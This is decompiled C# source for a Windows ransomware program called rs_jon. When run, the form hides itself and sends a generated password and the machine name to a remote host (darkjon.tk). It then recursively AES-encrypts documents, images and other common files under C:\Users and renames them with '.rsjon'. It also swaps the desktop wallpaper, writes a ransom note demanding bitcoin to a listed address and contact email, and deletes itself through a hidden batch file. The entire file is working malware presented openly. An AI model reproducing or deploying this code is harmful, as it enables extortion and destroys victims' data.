using System;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Net;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Text;
using System.Windows.Forms;

namespace rs_jon;

public class Form1 : Form
{
	private string extension = ".rsjon";

	private string targetURL = "http://darkjon.tk/rnsm/write.php";

	private string BTCAdress = "1AefQmfitXAuQDm1BSNpTN6mygpePd3MT6";

	private string contactMail = "darkjon@protonmail.com";

	private static string userDir = "C:\\";

	private static string userName = Environment.UserName;

	private static string path_1 = "Users\\";

	private string desktoppath = Environment.GetFolderPath(Environment.SpecialFolder.Desktop);

	private string documentpath = Environment.GetFolderPath(Environment.SpecialFolder.Personal);

	private string downloads = userDir + path_1 + Environment.UserName + "\\Downloads";

	private string user = Environment.UserName;

	private string computername = Environment.MachineName.ToString();

	private string userdir = Environment.GetFolderPath(Environment.SpecialFolder.UserProfile) + "\\";

	private static uint SPI_SETDESKWALLPAPER = 20u;

	private static uint SPIF_UPDATEINIFILE = 1u;

	private IContainer components = null;

	public Form1()
	{
		InitializeComponent();
		((Form)this).set_FormBorderStyle((FormBorderStyle)0);
	}

	private void Form1_Load(object sender, EventArgs e)
	{
		//IL_0038: Unknown result type (might be due to invalid IL or missing references)
		((Form)this).set_Opacity(0.0);
		((Form)this).set_ShowInTaskbar(false);
		if (CheckInternetConnection())
		{
			startAction();
			self_destruck();
		}
		else
		{
			MessageBox.Show("This Program Needs Internet Connection. Please Try Again Later.", "Internet Connection Error!", (MessageBoxButtons)1, (MessageBoxIcon)16);
			Application.Exit();
		}
	}

	public byte[] AES_Encrypt(byte[] bytesToBeEncrypted, byte[] passwordBytes)
	{
		byte[] result = null;
		byte[] salt = new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 };
		using (MemoryStream memoryStream = new MemoryStream())
		{
			using RijndaelManaged rijndaelManaged = new RijndaelManaged();
			rijndaelManaged.KeySize = 256;
			rijndaelManaged.BlockSize = 128;
			Rfc2898DeriveBytes rfc2898DeriveBytes = new Rfc2898DeriveBytes(passwordBytes, salt, 1000);
			rijndaelManaged.Key = rfc2898DeriveBytes.GetBytes(rijndaelManaged.KeySize / 8);
			rijndaelManaged.IV = rfc2898DeriveBytes.GetBytes(rijndaelManaged.BlockSize / 8);
			rijndaelManaged.Mode = CipherMode.CBC;
			using (CryptoStream cryptoStream = new CryptoStream(memoryStream, rijndaelManaged.CreateEncryptor(), CryptoStreamMode.Write))
			{
				cryptoStream.Write(bytesToBeEncrypted, 0, bytesToBeEncrypted.Length);
				cryptoStream.Close();
			}
			result = memoryStream.ToArray();
		}
		return result;
	}

	public string CreatePassword(int length)
	{
		StringBuilder stringBuilder = new StringBuilder();
		Random random = new Random();
		while (0 < length--)
		{
			stringBuilder.Append("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890*!=&?&/"[random.Next("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890*!=&?&/".Length)]);
		}
		return stringBuilder.ToString();
	}

	public void EncryptFile(string file, string password)
	{
		byte[] bytesToBeEncrypted = File.ReadAllBytes(file);
		byte[] bytes = Encoding.UTF8.GetBytes(password);
		bytes = SHA256.Create().ComputeHash(bytes);
		byte[] bytes2 = AES_Encrypt(bytesToBeEncrypted, bytes);
		File.WriteAllBytes(file, bytes2);
		File.Move(file, file + extension);
	}

	public void encryptDirectory(string location, string password)
	{
		try
		{
			string[] source = new string[23]
			{
				".txt", ".doc", ".docx", ".xls", ".xlsx", ".ppt", ".pptx", ".odt", ".jpg", ".png",
				".csv", ".sql", ".mdb", ".sln", ".php", ".asp", ".aspx", ".html", ".xml", ".psd",
				".rtf", ".pdf", ".jpeg"
			};
			string[] files = Directory.GetFiles(location);
			string[] directories = Directory.GetDirectories(location);
			for (int i = 0; i < files.Length; i++)
			{
				string value = Path.GetExtension(files[i]);
				if (source.Contains(value))
				{
					EncryptFile(files[i], password);
				}
			}
			for (int j = 0; j < directories.Length; j++)
			{
				encryptDirectory(directories[j], password);
			}
		}
		catch (Exception)
		{
		}
	}

	public static bool CheckInternetConnection()
	{
		try
		{
			using WebClient webClient = new WebClient();
			using (webClient.OpenRead("http://www.google.com"))
			{
				return true;
			}
		}
		catch
		{
			return false;
		}
	}

	public void startAction()
	{
		string password = CreatePassword(15);
		SendPassword(password);
		changewallpaper();
		Directory_Settings_Sending(password);
		messageCreator();
	}

	public string serial()
	{
		Random random = new Random();
		Random random2 = new Random();
		int num = random.Next(1000, 9999);
		string text = "ABCDEFGHIJKLMNOPQRSTUVWXYZ";
		string text2 = "";
		for (int i = 0; i < 5; i++)
		{
			text2 += text[random2.Next(text.Length)];
		}
		string text3 = user + "-" + num + "-" + text2;
		return text3.ToString();
	}

	public void SendPassword(string password)
	{
		string text = "?computer_name=" + computername + "&serialnumber=" + serial() + "&password=" + password + "&allow=ransom";
		string address = targetURL + text;
		new WebClient().DownloadString(address);
	}

	public void messageCreator()
	{
		string path = Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + "\\READ_ME_PLZ.txt";
		if (!File.Exists(path))
		{
			string[] contents = new string[6]
			{
				"Files has been encrypted with rs-jon",
				"Send me some bitcoins or kebab",
				"ur serial number is " + serial(),
				"send me $50 worth BTC in these adress = " + BTCAdress,
				"then send me mail with ur serial number with proof of payment like shit.",
				contactMail ?? ""
			};
			File.WriteAllLines(path, contents);
		}
	}

	public void self_destruck()
	{
		string text = Path.GetTempFileName() + ".bat";
		using (StreamWriter streamWriter = new StreamWriter(text))
		{
			streamWriter.WriteLine("@echo off");
			streamWriter.WriteLine("timeout 3 > NUL");
			streamWriter.WriteLine("CD " + Application.get_StartupPath());
			streamWriter.WriteLine("DEL \"" + Path.GetFileName(Application.get_ExecutablePath()) + "\" /f /q");
			streamWriter.WriteLine("CD " + Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\ex");
			streamWriter.WriteLine("DEL \"wallpaper.jpg\" /f /q ");
			streamWriter.WriteLine("CD " + Path.GetTempPath());
			streamWriter.WriteLine("DEL \"" + Path.GetFileName(text) + "\" /f /q");
		}
		Process.Start(new ProcessStartInfo
		{
			FileName = text,
			CreateNoWindow = true,
			ErrorDialog = false,
			UseShellExecute = false,
			WindowStyle = ProcessWindowStyle.Hidden
		});
		Environment.Exit(0);
	}

	[DllImport("user32.dll", CharSet = CharSet.Auto)]
	private static extern int SystemParametersInfo(uint uiAction, uint uiParam, string pvParam, uint fWinIni);

	[DllImport("user32.dll")]
	private static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);

	public static void changewallpaper()
	{
		try
		{
			Directory.CreateDirectory(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\ex");
			string text = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\ex\\wallpaper.jpg";
			((Image)Resource1.wallpaper).Save(text);
			SystemParametersInfo(SPI_SETDESKWALLPAPER, 1u, text, SPIF_UPDATEINIFILE);
		}
		catch
		{
			WebClient webClient = new WebClient();
			string text2 = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\ex\\wallpaper.jpg";
			webClient.DownloadFile("http://darkjon.tk/wallpaper.jpg", text2);
			SystemParametersInfo(SPI_SETDESKWALLPAPER, 1u, text2, SPIF_UPDATEINIFILE);
		}
	}

	public void Directory_Settings_Sending(string password)
	{
		string text = "Users\\";
		_ = userDir + text + userName + "\\Desktop";
		_ = userDir + text + userName + "\\Links";
		_ = userDir + text + userName + "\\Contacts";
		_ = userDir + text + userName + "\\Desktop";
		_ = userDir + text + userName + "\\Documents";
		_ = userDir + text + userName + "\\Downloads";
		_ = userDir + text + userName + "\\Pictures";
		_ = userDir + text + userName + "\\Music";
		_ = userDir + text + userName + "\\OneDrive";
		_ = userDir + text + userName + "\\Saved Games";
		_ = userDir + text + userName + "\\Favorites";
		_ = userDir + text + userName + "\\Searches";
		_ = userDir + text + userName + "\\Videos";
		encryptDirectory("C:\\Users", password);
	}

	protected override void Dispose(bool disposing)
	{
		if (disposing && components != null)
		{
			components.Dispose();
		}
		((Form)this).Dispose(disposing);
	}

	private void InitializeComponent()
	{
		//IL_004c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0056: Expected O, but got Unknown
		ComponentResourceManager componentResourceManager = new ComponentResourceManager(typeof(Form1));
		((Control)this).SuspendLayout();
		((ContainerControl)this).set_AutoScaleDimensions(new SizeF(6f, 13f));
		((ContainerControl)this).set_AutoScaleMode((AutoScaleMode)1);
		((Form)this).set_ClientSize(new Size(120, 0));
		((Form)this).set_Icon((Icon)componentResourceManager.GetObject("$this.Icon"));
		((Control)this).set_Name("Form1");
		((Form)this).set_Opacity(0.0);
		((Form)this).set_ShowInTaskbar(false);
		((Control)this).set_Text("Form1");
		((Form)this).add_Load((EventHandler)Form1_Load);
		((Control)this).ResumeLayout(false);
	}
}
